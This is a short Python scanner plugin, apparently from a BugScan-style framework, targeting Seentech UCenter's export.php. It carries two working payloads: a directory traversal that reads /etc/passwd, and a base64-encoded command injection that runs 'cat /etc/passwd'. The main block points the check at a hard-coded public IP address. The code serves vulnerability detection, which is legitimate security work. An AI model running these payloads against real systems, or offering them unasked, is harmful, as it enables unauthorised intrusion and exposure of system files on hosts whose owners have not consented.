#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2010-0123366

def assign(service, arg):
    if service == 'seentech_uccenter':
        return True, arg
        
def audit(arg):
    headers={'Content-Type': 'application/x-www-form-urlencoded'}
    payload1 = "ucenter/admin/export.php?kind=log&gNetGuardLogFilePath=&filename=../../../../../../../../etc/passwd"
    payload2 = "ucenter/admin/export.php?gCommand=zero_tools&cmd=IiAmIGNhdCAvZXRjL3Bhc3N3ZCAmICI%3D"
    for i in payload1,payload2:
        code,_,res,_,_ = curl.curl2(arg+i,headers=headers)
        if code==200 and 'root:/bin/bash' in res :
            security_warning(arg+i)
if __name__ == '__main__':
    from dummy import *
    audit(assign('seentech_uccenter', 'https://60.223.226.154/')[1])